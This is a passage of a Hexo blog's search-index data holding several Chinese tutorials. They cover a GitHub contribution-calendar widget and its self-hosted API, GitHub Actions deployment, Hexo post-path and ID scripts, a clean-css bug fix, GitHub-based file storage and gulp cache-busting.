a{color:#1D75AB;text-decoration:none;}.contrib-footer{font-size:11px;padding:0 10px 12px;text-align:left;width:100%;box-sizing:border-box;height:26px;}.left.text-muted{float:left;margin-left:9px;color:#767676;}.left.text-muted a{color:#4078c0;text-decoration:none;}.left.text-muted a:hover,.monospace a:hover{text-decoration:underline;}h2.f4.text-normal.mb-3{display:none;}.float-left.text-gray{float:left;}#user-activity-overview{display:none;}.day-tooltip{white-space:nowrap;position:absolute;z-index:99999;padding:10px;font-size:12px;color:#959da5;text-align:center;background:rgba(0,0,0,.85);border-radius:3px;display:none;pointer-events:none;}.day-tooltip strong{color:#dfe2e5;}.day-tooltip.is-visible{display:block;}.day-tooltip:after{position:absolute;bottom:-10px;left:50%;width:5px;height:5px;box-sizing:border-box;margin:0 0 0 -5px;content:\" \";border:5px solid transparent;border-top-color:rgba(0,0,0,.85)}.position-relative{width:100%;}@media screen and (max-width:650px){.contrib-column{display:none}}.angle-wrapper{z-index:9999;display:inline;width:200px;height:40px;position:relative;padding:5px 0;background:rgba(0,0,0,0.8);border-radius:8px;text-align:center;color:white;}.angle-box{position:fixed;padding:10px}.angle-wrapper span{padding-bottom:1em;}.angle-wrapper:before{content:\"\";width:0;height:0;border:10px solid transparent;border-top-color:rgba(0,0,0,0.8);position:absolute;left:47.5%;top:100%;}</style>';\n        return style\n    }\n};\nvar append_div_gitcalendar = (parent, text) => {\n    if (typeof text === 'string') {\n        var temp = document.createElement('div');\n        temp.innerHTML = text;\n        var frag = document.createDocumentFragment();\n        while (temp.firstChild) {\n            frag.appendChild(temp.firstChild)\n        }\n        parent.appendChild(frag)\n    } else {\n        parent.appendChild(text)\n    }\n};\nvar loading_git = (color) => {\n    loading = '<div id=\"github_loading\" style=\"height:100%;display: flex;align-items: center;justify-content: center;\"><svg style=\"height:50px;\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"  viewBox=\"0 0 50 50\" style=\"enable-background:new 0 0 50 50\" xml:space=\"preserve\"><path fill=\"' + color + '\" d=\"M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z\" transform=\"rotate(275.098 25 25)\"><animateTransform attributeType=\"xml\" attributeName=\"transform\" type=\"rotate\" from=\"0 25 25\" to=\"360 25 25\" dur=\"0.6s\" repeatCount=\"indefinite\"></animateTransform></path></svg></div>';\n    return loading\n};\n\n(function(){var git_user = '<username>';\n    var github_container = document.getElementsByClassName('github_container')[0];\n    var github_loading = document.getElementById('github_loading');\n    var git_purple = ['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f',];\n    var git_green = ['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];\n    var git_blue = ['#ebedf0', '#f1f8ff', '#dbedff', '#c8e1ff', '#79b8ff', '#2188ff', '#0366d6', '#005cc5', '#044289', '#032f62', '#05264c',];\n    var git_pink = ['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];\n    var git_color = git_purple;\n    append_div_gitcalendar(github_container, loading_git(git_color[4]));\n    github_canlendar(git_user, git_color)})()\n```\n\n上面代码需要修改第269行的`<username>`为自己的GitHub用户名，第276行自定义Calendar颜色主题，以及第2行的`<your-api>`。\n\n这里同样需要自建一个api来调用，且看下文。\n\n在主题配置文件的`inject`的`head`或`bottom`配置下增加一条：\n\n```yaml\n- <script data-pjax src=\"/js/githubcalendar.js\"></script>\n```\n\n如不需要适配pjax则将`data-pjax`去掉，如主题不支持在配置文件中`inject`则自行想办法将该js文件引入。\n\n<!-- endtab -->\n\n{% endtabs %}\n\n## 自建GitHub Calendar API\n\n为啥要自建？当然你完全可以用我的api，但毕竟如果用别人的服务，哪天服务崩了也会影响自己，所以反正这个建起来比较快，又是免费的，何乐而不为？\n\n这个东西的原理说白了，其实就是将GitHub个人主页上显示的东西爬取下来，按一定格式发送到前端，由前端解析渲染，因此如果你有自己的公网服务器，可以直接在服务器上运行下面的代码并且开放到公网：\n\n```python\n# -*- coding: UTF-8 -*-\nimport requests\nimport re\nfrom urllib.parse import urlparse, parse_qs\nfrom http.server import BaseHTTPRequestHandler,HTTPServer\nimport json\n\ndef list_split(items, n):\n    return [items[i:i + n] for i in range(0, len(items), n)]\ndef getdata(name):\n\n    # 2024-03-29 定义 headers 请求头\n    # 请见 https://github.com/yuhengwei2001/python_github_calendar_api/commit/0f37cfc003f09e99a1892602d8bc2b38137899d2#diff-b014e93fcab9bae29f453d7a616da5eac2f02947f32d02a1a1bf200eeaab5a39L11\n    headers = {\n        'Referer': 'https://github.com/'+ name,\n        'Sec-Ch-Ua': '\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Microsoft Edge\";v=\"122\"',\n        'Sec-Ch-Ua-Mobile': '?0',\n        'Sec-Ch-Ua-Platform': '\"Windows\"',\n        'Sec-Fetch-Dest': 'empty',\n        'Sec-Fetch-Mode': 'cors',\n        'Sec-Fetch-Site': 'same-origin',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',\n        'X-Requested-With': 'XMLHttpRequest'\n    }\n    # 发送请求时添加 headers 请求头\n    # gitpage = requests.get(\"https://github.com/\" + name)\n    gitpage = requests.get(\"https://github.com/\" + name  + \"?action=show&controller=profiles&tab=contributions&user_id=\"+ name, headers=headers)\n    data = gitpage.text\n    \n    # 2023-11-22 更新正则 https://github.com/Zfour/python_github_calendar_api/issues/18\n    datadatereg = re.compile(r'data-date=\"(.*?)\" id=\"contribution-day-component')\n    datacountreg = re.compile(r'<tool-tip .*?class=\"sr-only position-absolute\">(.*?) contribution')\n    \n    datadate = datadatereg.findall(data)\n    datacount = datacountreg.findall(data)\n    datacount = list(map(int, [0 if i == \"No\" else i for i in datacount]))\n\n    # 检查datadate和datacount是否为空\n    if not datadate or not datacount:\n        # 处理空数据情况\n        return {\"total\": 0, \"contributions\": []}\n        \n    # 将datadate和datacount按照字典序排序\n    sorted_data = sorted(zip(datadate, datacount))\n    datadate, datacount = zip(*sorted_data)\n    \n    contributions = sum(datacount)\n    datalist = []\n    for index, item in enumerate(datadate):\n        itemlist = {\"date\": item, \"count\": datacount[index]}\n        datalist.append(itemlist)\n    datalistsplit = list_split(datalist, 7)\n    returndata = {\n        \"total\": contributions,\n        \"contributions\": datalistsplit\n    }\n    return returndata\nclass handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        parsed_path = urlparse(self.path)\n        query_params = parse_qs(parsed_path.query)\n        user = query_params.get('user', [None])[0]  # 获取'user'参数的值，如果不存在则默认为None\n        data = getdata(user) if user else {\"error\": \"User parameter not provided\"}\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps(data).encode('utf-8'))\n        return\n```\n\n此代码通过`?user=`参数进行查询，这与前面通过插件安装的方法有所不同，插件是直接把用户名作为查询参数的：\n\n```js\nvar git_githubapiurl = \"https://python-github-calendar-api.vercel.app/api?\" + git_user;\n```\n\n如果前面通过插件安装，则需要注意修改接口代码或修改插件查询参数格式。\n\n---\n\n然而并不想为了运行这个玩意在服务器上开一个进程，那么我们还可以利用vercel这种平台来很方便地部署。\n\n首先，显然需要注册一个vercel账号，然后选择Add New->Project，选择\"Import Third-Party Git Repository →\"，在其中粘贴以下链接：\n\n`https://github.com/Zfour/python_github_calendar_api`\n\n或直接粘贴我的：`https://github.com/windshadow233/python_github_calendar_api`\n\n然后vercel会让你创建一个存储库，随便命名即可（可以同样命名为python_github_calendar_api），公开或私有皆可。接下来等待vercel部署成功。\n\n不过这里有一个小坑，直接一路啥都不改部署下来的服务，无论怎么查询都返回500，Google了半天发现似乎是Node版本的锅，在vercel项目的Settings里面将Node的版本从20.x降为18.x并重新部署，即可解决问题。\n\n![image-20240510034642117](https://oss.fyz666.xyz/blogfiles/png/55cd9c468b5a52f6ef2c91d27a9f3350.png)\n\n由于vercel的域名已经被污染了，这里我们可以绑定一个自己的域名。\n\n前往Settings->Domains，添加自己的域名，然后将该域名的CNAME解析到` cname.vercel-dns.com`即可。\n\n在浏览器中访问`https://<your-domain>/api?user=<username>`，如果服务正常，则可以获取到数据。\n\n---\n\n最后在前面的文件中修改api链接。\n\n{% tabs tab2 %}\n\n<!-- tab 插件安装 -->\n\n修改前面网站配置文件里的`githubcalendar.api`参数。\n\n<!-- endtab -->\n\n<!-- tab 魔改安装 -->\n\n修改前面js文件里的`git_githubapiurl`参数。\n\n<!-- endtab -->\n\n{% endtabs %}\n\n最后的最后，Hexo一键三连即可！\n","tags":["JavaScript","Web前端","Hexo","Hexo插件"],"categories":["博客相关","Hexo魔改"]},{"title":"使用GitHub Actions自动部署Hexo博客","url":"//blog/11277/","content":"\n为了更好地备份我的博客，我将其源码推送到了一个GitHub仓库。之前了解过一点GitHub Actions，遂想着通过这个东西来自动部署博客。\n\n随着博客的内容越来越多，本地编译的速度会越来越慢，况且我还使用了一些`gulp`插件，运行非常耗时，这个时候，把编译、部署的工作交给GitHub Actions就是一件非常舒服的事。另一方面，我以前没怎么用过这个功能，正好借此机会熟悉一下GitHub Actions的编写。\n\n---\n\n我的博客之前都是运行在云服务器上，而众所周知，GitHub提供了免费的静态页面托管服务——GitHub Pages。既然我已经把博客迁移到了静态站，那么现在不仅可以选择部署上服务器，还多了一个选择：将博客部署到仓库的GitHub Pages下。\n\n{% tabs tab1 %}\n\n<!-- tab 部署到云服务器 -->\n\n**设置环境变量**\n\n创建一个SSH密钥，用于此仓库连接服务器。\n\n```bash\nssh-keygen -t rsa -b 4096 -C \"git@github.com:windshadow233/windshadow233.github.io.git\"\n```\n\n这里，`windshadow233.github.io`是我的仓库名。\n\n将此公钥上传到服务器，并将私钥粘贴到仓库的secrets下，命名为`SSH_PRIVATE_KEY`：\n\n![image-20240505194134676](https://oss.fyz666.xyz/blogfiles/png/5ad4b9aae071cf3ea297ddc88713fd76.png)\n\n创建变量`SERVER_IP`，值为服务器的ip地址：\n\n![image-20240505194228194](https://oss.fyz666.xyz/blogfiles/png/3f3d7454c0b67a312900b0610169c95c.png)\n\n**创建workflow文件**\n\n在仓库根目录创建目录：`.github/workflows/`，然后在该目录下创建文件：`deploy.yml`\n\n```yaml\nname: Deploy Site\n\non:\n  push:\n    branches:\n      - main\n    paths:\n      - 'source/**'\n      - 'themes/**'\n      - '_config.yml'\n      - '_config.butterfly.yml'\n  workflow_dispatch:\n\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout\n      uses: actions/checkout@v4\n\n    - name: Set up Node\n      uses: actions/setup-node@v4\n      with:\n        node-version: '21.7.1'\n    - name: Cache Node modules\n      uses: actions/cache@v4\n      with:\n        path: node_modules\n        key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}\n        restore-keys: |\n          ${{ runner.os }}-node-\n\n    - name: Install Dependencies\n      run: npm install\n\n    - name: Generate Static Files\n      run: npm run b\n\n    - name: Set up SSH key\n      uses: webfactory/ssh-agent@v0.9.0\n      with:\n        ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }}\n\n    - name: Deploy with Rsync\n      run: |\n        ssh-keyscan -p 22 -H ${{ vars.SERVER_IP }} >> ~/.ssh/known_hosts\n        rsync -avz --delete -e \"ssh -p 22\" ./public/ root@${{ vars.SERVER_IP }}:/var/www/blog/\n```\n\n其中`npm run b`是我定义在`package.json`文件中的命令。上述文件表示在检测到`main`分支的`source/,themes/`目录以及配置文件的发生变更时，自动触发GitHub Actions。\n\n<!-- endtab -->\n\n<!-- tab 部署到GitHub Pages -->\n\n{% note info %}\n\n需要在GitHub中创建一个用于操作repo的token。\n\n{% endnote %}\n\n**创建workflow文件**\n\n在仓库根目录创建目录：`.github/workflows/`，然后在该目录下创建文件：`deploy.yml`\n\n```yaml\nname: Deploy Site\n\non:\n  push:\n    branches:\n      - main\n    paths:\n      - 'source/**'\n      - 'themes/**'\n      - '_config.yml'\n      - '_config.butterfly.yml'\n  workflow_dispatch:\n\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout\n      uses: actions/checkout@v4\n\n    - name: Set up Node\n      uses: actions/setup-node@v4\n      with:\n        node-version: '21.7.1'\n    - name: Cache Node modules\n      uses: actions/cache@v4\n      with:\n        path: node_modules\n        key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}\n        restore-keys: |\n          ${{ runner.os }}-node-\n\n    - name: Install Dependencies\n      run: npm install\n\n    - name: Generate Static Files\n      run: npm run b\n\n    - name: Deploy to gh-pages\n      uses: JamesIves/github-pages-deploy-action@v4\n      with:\n        token: ${{ secrets.GITHUB_TOKEN }}\n        branch: gh-pages\n        folder: public\n```\n\n前往仓库的Settings->Actions->General，将Actions对仓库的操作权限提升为“读写”：\n\n![image-20240511212745256](https://oss.fyz666.xyz/blogfiles/png/1c8afeb2c1182591a1387f9e8037fe2d.png)\n\ngh-pages分支生成后，前往仓库的Settings->Pages，选择Deploy from a branch：gh-pages\n\n![image-20240511212922999](https://oss.fyz666.xyz/blogfiles/png/0613199a3fd57618c142deb5d26ae671.png)\n\n<!-- endtab -->\n\n{% endtabs %}\n\n自此，GitHub Actions配置完成，现在push到此仓库的main分支时就会自动触发Hexo的部署流程。\n\n当然，也可以在workflow里将上面两种部署方法全部写上，相当于博客的多个镜像站，也是非常不错的选择，另外，将gh-pages分支绑定到一些静态服务托管平台（例如Vercel），可以实现多镜像站同步的效果。\n","tags":["Hexo","GitHub","GitHub Actions"],"categories":["博客相关"]},{"title":"高自由度地管理Hexo博客的文章本地路径","url":"//blog/11229/","content":"\nHexo默认将所有的文章都放在`source/_posts`这一级目录下，一旦文章多起来，就很乱七八糟。因此，往往会选择将文章分在不同的子目录下，以方便我们对它们进行管理。最常见的配置方法就是按文章创建的时间分配目录。\n\n{% tabs tab1 %}\n\n<!-- tab 修改Hexo的配置文件 -->\n\n`_config.yml`文件提供了一个配置项：`new_post_name`，可以用来定义文章的路径，将其值设置为`:year/:month/:title.md`即可。\n\n<!-- endtab -->\n\n<!-- tab 自己写脚本实现 -->\n\n如果对文章路径有其他更个性化的需求，通过改配置文件的方法就显得不那么自由了，这一需求也可以通过编写脚本实现。\n\nHexo定义了一个处理文章路径的过滤器：[new_post_path](https://hexo.io/zh-cn/api/filter#new-post-path)，可以通过对其注册一个函数来实现对文章本地路径的修改。与[上篇文章](/blog/11219/)类似，我们在根目录的`scripts`目录下创建一个新的文件：`modify-post-path.js`，内容如下：\n\n```js\nconst path = require('path');\n\n\nhexo.extend.filter.register('new_post_path', function(filePath){\n  if (!filePath.includes(path.join(process.cwd(), 'source', '_posts'))) return filePath;\n  var filename = path.basename(filePath);\n  var dirname = path.dirname(filePath);\n  var date = new Date();\n  var year = date.getFullYear().toString();\n  var month = (date.getMonth() + 1).toString().padStart(2, '0');\n  var newPath = path.join(dirname, year, month, filename);\n  return newPath;\n});\n```\n\n该函数首先忽略了所有`page`，只对`post`页面进行处理，接下来的内容就不说了，非常容易理解。\n\n<!-- endtab -->\n\n{% endtabs %}\n\n---\n\n由于我已设置了`permalink: /blog/:id/`，因此改变文件的路径不会影响对应文章在网页中的URL。\n\n最后，根据我自己的需求，我需要修改一下[上篇文章](/blog/11219/)中提到的自动生成唯一自增ID的函数。\n\n```js\nconst fs = require('fs-extra');\nconst path = require('path');\nconst fm = require('hexo-front-matter');\n\n\nhexo.on('new', function(post){\n  const postsDir = path.join(process.cwd(), 'source', '_posts');\n  if (!post.path.includes(postsDir)) return;\n  const fileName = path.basename(post.path);\n  const years = fs.readdirSync(postsDir).sort().reverse();\n  for (let year of years) {\n    const months = fs.readdirSync(path.join(postsDir, year)).sort().reverse();\n    for (let month of months) {\n      const files = fs.readdirSync(path.join(postsDir, year, month));\n      const postFiles = files.filter(file => file.endsWith('.md') && file !== fileName);\n      if (postFiles.length > 0) {\n        let maxId = 0;\n        postFiles.forEach(file => {\n          let content = fm.parse(fs.readFileSync(path.join(postsDir, year, month, file), \"utf8\"));\n          if (typeof content.id !== 'undefined') {\n            maxId = Math.max(maxId, content.id);\n          }\n        });\n        content = fm.parse(post.content);\n        content.id = maxId + Math.floor(Math.random() * 100) + 1;\n        console.log(`${post.path} -> ${content.id}`);\n        fs.writeFileSync(post.path, '---\\n' + fm.stringify(content));\n        return;\n      }\n    }\n  }\n});\n```\n\n由于已经将文章按时间归类了，而文章的`id`又是自增的，因此只需要找到最新的月份目录即可确定当前的最大`id`。","tags":["NodeJS","Hexo"],"categories":["博客相关","Hexo魔改"]},{"title":"为Hexo文章自动生成唯一的自增ID","url":"//blog/11219/","content":"\n[前文](/blog/11025/)曾提到过我将博客从WordPress迁移到Hexo时，希望保留原有的永久链接格式：`/blog/:id/`，然而Hexo本身并不支持自动生成这样的`id`，虽然有一些插件例如[hexo-abbrlink](https://github.com/rozbo/hexo-abbrlink)支持生成这种数字`id`，但好像也不是我想要的样子。\n\n我仍希望保持之前那种WordPress下的格式，即每篇文章的`id`单调递增，且每次的递增值比较“随机”（这个自增在WordPress中是MySQL数据库的行为，MySQL会为`wp_post`表中的所有内容分配`id`，而这些内容不仅包含了已发布的文章，还包含文章中插入的图片、文章的修订版本以及文章的自动保存版本等等，因此在发布文章时，往往这个新文章的`id`会看上去比较随机地递增）。\n\n而现在Hexo没有数据库了，但我仍想保持这种随机增长的文章`id`风格。那要怎么办呢？每次手动算`id`自然不太方便，不妨自己来写个插件。\n\n------\n\n通过阅读[Hexo的文档](https://hexo.io/zh-cn/api/events)，我简单了解了一下如何在Hexo中监听事件，例如在“生成新文章后”触发一些自定义的函数。首先在博客的根目录下（这里的根目录是项目的根目录，即包含了博客配置文件的目录）创建`scripts`文件夹，然后在下面创建的`javascript`文件会自动被Hexo读取执行。\n\n先安装一个包：`fs-extra`，是`fs`模块的扩展。\n\n```bash\nnpm install fs-extra --save\n```\n\n我安装的版本：`\"fs-extra\": \"^11.2.0\"`\n\n在`scripts`目录下创建一个`auto-id.js`：\n\n```js\nconst fs = require('fs-extra');\nconst path = require('path');\nconst fm = require('hexo-front-matter');\n\nhexo.on('new', function(post){\n  if (!post.path.includes(path.join(process.cwd(), 'source', '_posts'))) return;\n  let maxId = 0;\n  fs.readdir(path.join(process.cwd(), 'source', '_posts'), (err, files) => {\n    if (err) throw err;\n    files.forEach( (fpath) => {\n      if(fpath.endsWith('.md')){\n        let content = fm.parse(fs.readFileSync(path.join(process.cwd(), 'source', '_posts', fpath), \"utf8\"));\n        if (typeof content.id !== 'undefined') {\n          maxId = Math.max(maxId, content.id);\n        }\n      }\n    });\n    content = fm.parse(fs.readFileSync(post.path, \"utf8\"));\n    content.id = maxId + Math.floor(Math.random() * 100) + 1;\n    console.log(`${post.path} -> ${content.id}`);\n    fs.writeFileSync(post.path, '---\\n' + fm.stringify(content));\n  });\n});\n```\n\n然后遍历一遍文章，取出当前最大的`id`（这个操作有点蠢，不过暂且这样吧，懒得用其他方式去做持久化），然后在此基础上加一个随机值，就得到了新的`id`，最后将它写入到新文章的`front-matter`中。不过不知道为什么最后得手动在最前面添加`---\\n`，试了一下`fm.stringify`的参数`prefixSeparator`也并没有啥用。\n\n这样就相当于写了一个非常简单的插件了，这个插件可以为文章自动生成一个`id`，效果如下：\n\n```bash\n╰─➤  npx hexo new post \"为Hexo文章自动生成唯一的自增ID\"\nINFO  Validating config\nINFO\n  ===================================================================\n      #####  #    # ##### ##### ###### #####  ###### #      #   #\n      #    # #    #   #     #   #      #    # #      #       # #\n      #####  #    #   #     #   #####  #    # #####  #        #\n      #    # #    #   #     #   #      #####  #      #        #\n      #    # #    #   #     #   #      #   #  #      #        #\n      #####   ####    #     #   ###### #    # #      ######   #\n                            4.14.0-b1\n  ===================================================================\nINFO  Created: ~/.../source/_posts/为Hexo文章自动生成唯一的自增ID.md\n.../source/_posts/为Hexo文章自动生成唯一的自增ID.md -> 11219\n```\n\n","tags":["NodeJS","Hexo"],"categories":["博客相关","Hexo魔改"]},{"title":"gulp-clean-css插件优化时的bug及解决方案","url":"//blog/11197/","content":"\n[之前的文章](/blog/11084/)提到我为了控制静态文件版本使用了一个叫Gulp的包，同时为了压缩css文件大小，在其中使用了一个名为[gulp-clean-css](https://github.com/scniro/gulp-clean-css)的插件，不过这个插件存在一个~~比较严重~~其实也不是很严重的bug。\n\n---\n\n一次，我魔改完主题样式，在本地测试效果良好的前提下，啪啪一顿执行`npm run b && npm run d`将其部署上服务器，结果从手机上打开网站一看，发现菜单样式完全崩坏，与本地测试时看到的样子截然不同。\n\n花了几分钟定位问题，发现优化完的css文件中有一些奇怪的东西：\n\n```css\n.menus_item_child li:not(#sidebar-menusli){\n    ...\n}\n```\n\n显然该样式本来应该是这样的：\n\n```css\n.menus_item_child li:not(#sidebar-menus li){\n    ...\n}\n```\n\n插件将`:not`选择器里的空格优化掉了。在`clean-css`的GitHub issues下面，果然找到了多条相关的bug，例如：\n\n[Spaces removed from :not statement](https://github.com/clean-css/clean-css/issues/996)\n\n[Issue with minifying not pseudo-class alongside using selector inside it](https://github.com/clean-css/clean-css/issues/1175)\n\n第一条issue下面，项目的维护者回复:\n\n> Fixed in `e651f24`\n\n第二条则有其他用户的评论:\n\n> I tested the version `5.1.3` and this issue is fixed in this version.\n\n于是，只要将gulp-clean-css插件依赖的clean-css版本修改到`5.1.3`，应该就可以解决问题。\n\n然而直接改`package.json`应该不太行，于是我又找到了一条[相关的issue](https://github.com/scniro/gulp-clean-css/issues/91)，下面有人评论：\n\n> Here’s a fork that appears better maintained https://github.com/aptuitiv/gulp-clean-css\n\n火速卸载`gulp-clean-css`，再安装`@aptuitiv/gulp-clean-css`:\n\n```bash\nnpm uninstall gulp-clean-css --save\nnpm install @aptuitiv/gulp-clean-css --save\n```\n\n再将之前的`gulpfile.js`修改一下:\n\n```diff\n@@ -1,5 +1,5 @@\n const gulp = require('gulp');\n-const cleancss = require('gulp-clean-css');\n+const cleancss = require('@aptuitiv/gulp-clean-css');\n const uglify = require('gulp-uglify-es').default;\n const htmlmin = require('gulp-html-minifier-terser');\n const rev = require('gulp-rev-all');\n```\n\n即可修复这个bug。","tags":["Web前端","npm","NodeJS","Gulp"],"categories":["Debug","博客相关"]},{"title":"利用GitHub做对象存储服务","url":"//blog/11170/","content":"\n我的blog上有很多图片，它们不仅分布于文章内容、文章封面，还会大量出现在相册里。\n\n把所有的图片都存在Hexo目录下虽然方便，但博客目录会十分臃肿，并且会拖慢Hexo生成public目录的速度，另外，如果使用了GitHub Pages等静态服务部署博客，每次推送部署都要把一堆图片打包过去，影响部署速度（或许能增量部署？不过我没有尝试过）。总之——当图片数量很多时，使用对象存储服务是有必要的。\n\n对比了各种对象存储服务商，我觉得我还是把GitHub利用起来吧，至少它免费、稳定、没有跑路风险。\n\n不过仍有需要注意的地方⚠️\n\n{% note warning %}\n- GitHub原则上是反对仓库图床化的，当仓库超过 1G 后会有人工审核仓库内容，因此需要注意仓库不要太大。\n- jsDelivr 加速的单文件大小限制为 50M。\n{% endnote %}\n\n基于上述原因，后续我会逐步将图片迁移到更加合适的对象存储平台。\n\n{% note info %}\n更新于2024-05-17：将所有图片迁移至[自建对象存储服务](https://oss.fyz666.xyz/)。\n{% endnote %}\n\n---\n\n已有一些支持GitHub图床的软件：[PicX](https://github.com/XPoet/picx)、[PicGo](https://github.com/PicGo/PicGo-Core)，不过这些软件默认只能上传图片文件，没法传其他格式的文件。既然GitHub支持API管理仓库，那为什么不直接写个脚本来处理文件上传这件事呢？这样基本上任何需求都可以通过简单写几句代码实现，拥有更高的自由度，岂不美哉。\n\n{% link GitHub API文档,GitHub,https://docs.github.com/en/rest/using-the-rest-api/getting-started-with-the-rest-api %}\n\n我的需求是将文件按后缀名分类，存储在对应的目录下，并且将文件重命名为它自身的md5摘要，这样肯定不会遇到collision吧（大概！），并且用[jsDelivr](https://www.jsdelivr.com/)进行加速。这里我就直接贴代码了：\n\n```python\nimport os\nimport requests\nimport base64\nimport hashlib\nimport retry\n\n\ndef md5(file_content):\n    hash_md5 = hashlib.md5()\n    hash_md5.update(file_content)\n    return hash_md5.hexdigest()\n\n\nclass GitHubStorage(object):\n\n    def __init__(self, username, repo, token, branch='main'):\n        self.username = username\n        self.repo = repo\n        self.token = token\n        self.branch = branch\n        self.headers = {\n            'Authorization': f'token {token}',\n            'Accept': 'application/vnd.github.v3+json',\n        }\n        self.cdn = f'https://cdn.jsdelivr.net/gh/{username}/{repo}@{branch}/'\n        \n    def get_file_info(self, filepath):\n        with open(filepath, 'rb') as file:\n            content = file.read()\n        ext = os.path.splitext(filepath)[-1]\n        hash_md5 = md5(content)\n        file_name = hash_md5 + ext\n        path = 'blank' if ext == '' else ext.lower()[1:]\n        return content, path, file_name\n\n    @retry.retry(tries=5, delay=1)\n    def upload(self, filepath):\n        content, path, file_name = self.get_file_info(filepath)\n        api_url = f'https://api.github.com/repos/{self.username}/{self.repo}/contents/{path}/{file_name}'\n        data = {\n            'message': 'Upload new file',\n            'content': base64.b64encode(content).decode('utf-8'),\n            'branch': self.branch\n        }\n        r = requests.put(api_url, headers=self.headers, json=data).json()\n        return self.cdn + f'{path}/{file_name}'\n```\n\n上述脚本可以配合`typora`进行使用，实现markdown粘贴图片自动上传：\n\n![](https://oss.fyz666.xyz/blogfiles/png/1b4951c40f326935fcb03a870aabb371.png)\n\n顺便可以在脚本里加一句`os.remove()`，以删除`typora`自动在本地保存的图片。\n","tags":["Python","GitHub API","对象存储"],"categories":["博客相关"]},{"title":"使用Gulp解决Hexo静态站的文件缓存问题","url":"//blog/11084/","content":"\n作为一个喜欢魔改网站主题的人，在将博客迁移到静态站后，首先需要解决的便是浏览器的缓存问题。浏览器在遇到对静态资源的请求时，通常会采取两种缓存策略，分别是**强制缓存**和**协商缓存**。\n\n- 强制缓存：在一定时间（由服务器给出的请求头标识）内不再向服务器发出请求，而是直接使用缓存的内容。\n- 协商缓存：与服务器协商是否需要重新请求。\n\n显然，由于缓存策略的存在，当服务端的静态文件发生变更后，客户端经常不会立刻加载最新版本的文件。对于这一点，之前我在动态博客中的解决方案是手动为静态文件加一个版本号，例如`theme.css?v=1.2.1`。不过在Hexo中所有的html页面都是自动编译生成的，而且会产生一大堆页面，因此并不可能一个一个地手动为静态文件添加版本。\n\n经过一番搜索，我在一条[GitHub issue](https://github.com/hexojs/hexo/issues/3042#issuecomment-369648375)下面找到了一个看上去不错的方案：\n\n> directly use webpack or gulp (commend to install at root folder). first, hexo generate the publish files, then webpack or gulp revision the files.\n\n不过我先前几乎没有这些前端工作流的经验，因此花了半天时间才大概搞明白这句话的含义并让这个方案work。\n\n## 安装依赖\n\nGulp是一个强大的前端自动化构建工具，其有很多插件，能够满足许多需求，为文件名添加hash只是其中一个插件的功能，还有一些插件可以用来优化文件大小，这里就顺带一并装上。\n\n先全局安装gulp，并安装一些用于优化静态文件的插件：\n\n```bash\nnpm install gulp --global\nnpm install gulp gulp-clean-css gulp-uglify-es gulp-html-minifier-terser\n```\n\n然后安装一个可以为静态文件打版本tag的插件：\n\n```bash\nnpm install gulp-rev-all --save\n```\n\n这里的问题是，默认的gulp-rev-all版本是4，并不支持通过旧规范的`require`语句导入，因此我手动降了一下版本，将package.json里的大版本号改到了3，这里我使用的版本信息如下：\n\n```json\n...\n  \"dependencies\": {\n    \"gulp\": \"^5.0.0\",\n    \"gulp-clean-css\": \"^4.3.0\",\n    \"gulp-html-minifier-terser\": \"^7.1.0\",\n    \"gulp-rev-all\": \"^3.0.0\",\n    \"gulp-uglify-es\": \"^3.0.0\",\n    ...\n  }\n...\n```\n\n做了版本号调整后，再重新安装，这样便能通过旧的语法进行导入了。\n\n## 编写gulpfile.js文件\n\n在博客项目的根目录下创建gulpfile.js，内容如下：\n\n```js\nconst gulp = require('gulp');\nconst cleancss = require('gulp-clean-css');\nconst uglify = require('gulp-uglify-es').default;\nconst htmlmin = require('gulp-html-minifier-terser');\nconst RevAll = require('gulp-rev-all');\n\n\ngulp.task('minify-css', () => {\n    return gulp.src('./public/**/*.css')           // 处理public目录下所有的css文件，下同\n        .pipe(cleancss({ compatibility: 'ie8' }))  // 兼容到IE8\n        .pipe(gulp.dest('./public'));\n});\n\ngulp.task('minify-js', () => {\n    return gulp.src('./public/**/*.js')\n        .pipe(uglify())\n        .pipe(gulp.dest('./public'));\n});\n\ngulp.task('minify-html', () => {\n    return gulp.src('./public/**/*.html')\n        .pipe(htmlmin({\n            removeComments: true,                 // 移除注释\n            removeEmptyAttributes: true,          // 移除值为空的参数\n            removeRedundantAttributes: true,      // 移除值跟默认值匹配的属性\n            collapseBooleanAttributes: true,      // 省略布尔属性的值\n            collapseWhitespace: true,             // 移除空格和空行\n            minifyCSS: true,                      // 压缩HTML中的CSS\n            minifyJS: true,                       // 压缩HTML中的JS\n            minifyURLs: true                      // 压缩HTML中的链接\n        }))\n        .pipe(gulp.dest('./public'))\n});\n\ngulp.task('rev', () => {\n    return gulp.src('public/**/*.{css,js,html}')\n        .pipe(RevAll.revision({\n          dontRenameFile: ['.html'],\n          dontUpdateReference: ['.html']\n        }))\n        .pipe(gulp.dest('./public'))\n        .pipe(RevAll.manifestFile())\n        .pipe(gulp.dest('./public'))\n})\n\ngulp.task('default', gulp.parallel(\n    'minify-css', 'minify-js', 'minify-html', 